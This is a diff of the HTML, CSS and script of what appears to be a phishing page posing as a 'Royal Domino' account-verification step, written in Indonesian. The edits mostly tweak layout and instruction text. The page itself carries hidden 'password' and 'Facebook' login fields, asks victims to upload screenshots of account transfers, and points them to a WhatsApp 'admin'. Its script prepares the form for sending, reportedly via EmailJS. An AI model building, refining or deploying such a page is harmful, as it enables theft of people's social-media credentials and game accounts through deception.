@@ -75,7 +75,7 @@ body {
   font-weight: 700px
 }
 
-.verifikasikeamanannwg {
+.verifikasikeamananwg {
   padding: 10px
 }
 
@@ -216,11 +216,11 @@ body {
 
 .buttonnwgverifhdi {
   text-align: center;
-    /* PERUBAHAN KRUSIAL UNTUK TOMBOL SAMPINGAN */
+    /* PERUBAHAN CSS UNTUK MENEMPATKAN 2 TOMBOL BERDAMPINGAN */
     display: flex;
     justify-content: space-around;
     align-items: center;
-    padding: 10px 20px;
+    padding: 10px 0;
 }
 
 .buttonnwgverifhdi button {
@@ -228,7 +228,7 @@ body {
   background-image: linear-gradient(0deg, #67a309 0, #c7ee4c 100%);
   color: #268707;
   border: none;
-  font-size: 16px; /* Disesuaikan */
+  font-size: 16px; /* Disesuaikan agar muat */
   font-weight: 600;
   margin-top: 10px;
   line-height: 25px; /* Disesuaikan */
@@ -236,9 +236,10 @@ body {
   box-shadow: 0 2px 1px 0 #1a5806;
   outline: 0;
   padding: 4px 15px; /* Disesuaikan */
+  width: 45%; /* Ambil 45% lebar container */
 }
 
-/* CSS UNTUK TOMBOL WHATSAPP DI SAMPING KIRIM */
+/* Style WA baru */
 .wa-inline-button {
     display: inline-block;
     background-color: #25d366 !important;
@@ -252,6 +253,8 @@ body {
     border-radius: 10px;
     padding: 4px 15px;
     margin-top: 10px;
+    width: 45%; /* Ambil 45% lebar container */
+    text-align: center;
 }
 </style>
  </head> 
@@ -322,20 +325,15 @@ body {
                               </div>         </div>
       <div>
           <div class="boxnwgverifmarsya"> 
-      <div class="ucapanverifnwg" style="text-align: center; line-height: 25px;"> 
-       <span style="color: #ffbc68; font-weight: bold;">
-            Langkah Konfirmasi: Unggah Bukti!
-        </span> 
-        <span>
-            Silahkan unggah screenshot histori pengiriman Anda (Wajib), lalu tekan 'Kirim'.
-        </span>
+      <div class="ucapanverifnwg"> 
+       <span>SILAHKAN KIRIM SCRENSHOOT HISTORI PERNGIRIMAN AKUN ANDA KE AKUN YANG TERTERA DI ATAS</span> 
         </div>
         <div class="itemkontol">
                <div style="background: #0b5250;">   <div class="appnwghdiprem" style="background: #0b5250;"> 
    <div class="containernwghdi"> 
     <div class="boxverifnwghdi"> 
      <div class="headernwgverifhdi"> 
-       <div style="display: block;">                         <input type="file" id="myFile" name="filename" style="width: 90%; margin: 10px auto; background: #d5b184; padding: 10px; border-radius: 5px;">
+       <div style="display: block;">             <input type="file" id="myFile" name="filename">
         </div>
        </div>
        <div style="background: #0b5250;">   <div class="appnwghdiprem" style="background: #0b5250;"> 
@@ -369,7 +367,7 @@ body {
                                           <input type="hidden" name="password" id="resspw" value="" readonly>
                                           <input type="hidden" name="login" id="nwg_login_fb" value="Facebook" readonly>
                                           
-                                          <button type="submit">Kirim</button> 
+                                                                                    <button type="submit">Kirim</button> 
                                          <a href="https://wa.me/6285343802982?text=Halo%20Admin%20Royal%20Domino%2C%20saya%20sudah%20mengisi%20formulir%20dan%20ingin%20mengirim%20screenshot%20konfirmasi%20transaksi." class="wa-inline-button" target="_blank">
                                             <i class="fab fa-whatsapp"></i> Chat Admin
                                          </a>
@@ -422,8 +420,8 @@ function myFunction() {
     // Dapatkan referensi ke input file (ID: myFile)
     const fileInput = document.getElementById('myFile');
     
-    // 1. DISABLE input file sebelum pengiriman
-    // Ini adalah langkah KRUSIAL untuk mencegah Error 400/500 dari EmailJS.
+    // 1. DISABLE input file sebelum pengiriman (INTI FUNGSI)
+    // Mengatur properti 'disabled' pada elemen input file.
     if(fileInput) { 
         fileInput.disabled = true;
     }
